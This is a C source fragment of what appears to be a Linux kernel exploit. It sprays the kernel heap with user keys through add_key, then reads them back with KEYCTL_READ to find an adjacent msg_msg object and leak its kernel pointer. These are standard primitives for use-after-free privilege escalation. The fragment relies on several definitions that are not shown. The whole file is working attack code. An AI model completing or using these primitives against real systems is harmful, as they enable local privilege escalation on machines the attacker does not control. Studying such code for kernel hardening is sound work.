#include <linux/keyctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <errno.h>
#include <stdint.h>

struct fake_user_key_payload {
  void *next;
  void *callback;
  short unsigned int datalen;
};

int *spray_user_key(int n, int size)
{
  int payload_size = size - sizeof(struct fake_user_key_payload);
  int *fd = malloc(n * sizeof(int));

  void *addr = malloc(0x30000);
  char *buf = addr;
  char *name = (uint64_t)addr + 0x20000;
  memcpy((void*)name, "user\000", 5);
  for (int i = 0; i < n; i++) {
    memset(buf, 0x41, payload_size);
    *(uint64_t *)buf = 0;
    char *des = (uint64_t)addr + 0x10000ul;
    sprintf((void*)des, "syz%d\x00", i);
    fd[i] = syscall(__NR_add_key, name, des, buf, payload_size, -1);
    if (fd[i] < 0)
      errx(1, "add_key failed: %d\n", errno);
  }
  return fd;
}

int leak_info(int *key_fd) 
{
  char *leak_buf = malloc(0x8000);
  memset(leak_buf, 0x42, 0x8000);
  for (int i=0; i<num_keys; i++) {
    *(uint64_t*)leak_buf = 0;
    syscall(__NR_keyctl, KEYCTL_READ, key_fd[i], leak_buf, 0x8000, 0);
    if (*(uint64_t*)leak_buf != 0) {
      for (int j=0; j<8; j++) {
        uint64_t *data = (uint64_t)leak_buf + j*PAGE_SIZE - sizeof(struct fake_user_key_payload) + sizeof(struct fake_msg_msg);
        printf("payload %d msg %d data %llx\n", i, j, *data);
        if (*data == 0x3737373737373737) {
          struct fake_msg_msg *msg = (uint64_t)leak_buf + j*PAGE_SIZE - sizeof(struct fake_user_key_payload);
          printf("[+] msg->next %llx\n", msg->next);
          break;
        }
      }
      break;
    }
  }
}